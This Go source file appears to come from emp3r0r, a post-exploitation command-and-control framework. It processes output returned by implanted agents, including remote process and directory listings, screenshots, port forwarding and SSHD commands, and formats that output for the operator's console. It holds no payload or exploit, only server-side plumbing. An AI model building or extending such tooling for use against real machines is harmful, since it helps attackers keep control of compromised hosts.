package server

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// processAgentData deal with data from agent side
func processAgentData(data *emp3r0r_def.MsgTunData) {
	var err error
	runtime_def.AgentControlMapMutex.RLock()
	defer runtime_def.AgentControlMapMutex.RUnlock()

	target := agents.GetAgentByTag(data.Tag)
	contrlIf := runtime_def.AgentControlMap[target]
	if target == nil || contrlIf == nil {
		logging.Errorf("Target %s cannot be found, however, it left a message saying:\n%v",
			data.Tag, data.CmdSlice)
		return
	}

	// cmd output from agent
	cmd := data.CmdSlice[0]
	is_builtin_cmd := strings.HasPrefix(cmd, "!")
	cmd_slice := data.CmdSlice
	out := data.Response
	cmd_id := data.CmdID
	// cache this cmd response
	runtime_def.CmdResultsMutex.Lock()
	runtime_def.CmdResults[cmd_id] = out
	runtime_def.CmdResultsMutex.Unlock()

	switch cmd_slice[0] {
	// screenshot command
	case "screenshot":
		go func() {
			// FIXME: import cycle from `core`
			// err = processScreenshot(out, target)
			// if err != nil {
			// 	logging.Errorf("%v", err)
			// }
		}()

		// ps command
	case "ps":
		var procs []util.ProcEntry
		err = json.Unmarshal([]byte(out), &procs)
		if err != nil {
			logging.Debugf("ps: %v", err)
			logging.Errorf("ps: %s", err, out)
			return
		}

		// build table
		tdata := [][]string{}
		tableString := &strings.Builder{}
		table := tablewriter.NewWriter(tableString)
		table.SetHeader([]string{"Name", "PID", "PPID", "User"})
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoWrapText(true)
		table.SetColWidth(20)

		// color
		table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

		table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor})

		// fill table
		for _, p := range procs {
			pname := util.SplitLongLine(p.Name, 20)
			tdata = append(tdata, []string{pname, strconv.Itoa(p.PID), strconv.Itoa(p.PPID), p.Token})
		}
		table.AppendBulk(tdata)
		table.Render()
		out = tableString.String()

		// resize pane since table might mess up
		x := len(strings.Split(out, "\n")[0])
		cli.FitPanes(x)

		// ls command
	case "ls":
		var dents []util.Dentry
		err = json.Unmarshal([]byte(out), &dents)
		if err != nil {
			logging.Debugf("ls: %v", err)
			logging.Errorf("ls: %s", out)
			return
		}

		// build table
		tdata := [][]string{}
		tableString := &strings.Builder{}
		table := tablewriter.NewWriter(tableString)
		table.SetHeader([]string{"Name", "Type", "Size", "Time", "Permission"})
		table.SetRowLine(true)
		table.SetBorder(true)
		table.SetColWidth(20)
		table.SetAutoWrapText(true)

		// color
		table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

		table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor})

		// fill table
		for _, d := range dents {
			dname := util.SplitLongLine(d.Name, 20)
			tdata = append(tdata, []string{dname, d.Ftype, d.Size, d.Date, d.Permission})
		}

		// print table
		table.AppendBulk(tdata)
		table.Render()
		out = tableString.String()

		// resize pane since table might mess up
		x := len(strings.Split(out, "\n")[0])
		cli.FitPanes(x)
	}

	// Command output
	no_need_to_show := strings.HasPrefix(cmd, emp3r0r_def.C2CmdPortFwd) ||
		strings.HasPrefix(cmd, emp3r0r_def.C2CmdSSHD) || strings.HasPrefix(cmd, emp3r0r_def.C2CmdListDir)
	if logging.Level < 3 {
		// ignore some cmds
		if no_need_to_show {
			return
		}
	}
	agent_output := fmt.Sprintf("\n[%s] %s:\n%s\n\n",
		color.CyanString("%d", contrlIf.Index),
		color.HiMagentaString("%s", cmd),
		color.HiWhiteString(out))
	logging.Printf(agent_output)

	// time spent on this cmd
	start_time, err := time.Parse("2006-01-02 15:04:05.999999999 -0700 MST", runtime_def.CmdTime[cmd_id])
	if err != nil {
		logging.Warningf("Parsing timestamp '%s': %v", runtime_def.CmdTime[cmd_id], err)
	} else {
		time_spent := time.Since(start_time)
		if is_builtin_cmd {
			logging.Debugf("Command %s took %s", strconv.Quote(cmd), time_spent)
		} else {
			logging.Printf("Command %s took %s", strconv.Quote(cmd), time_spent)
		}
	}
}
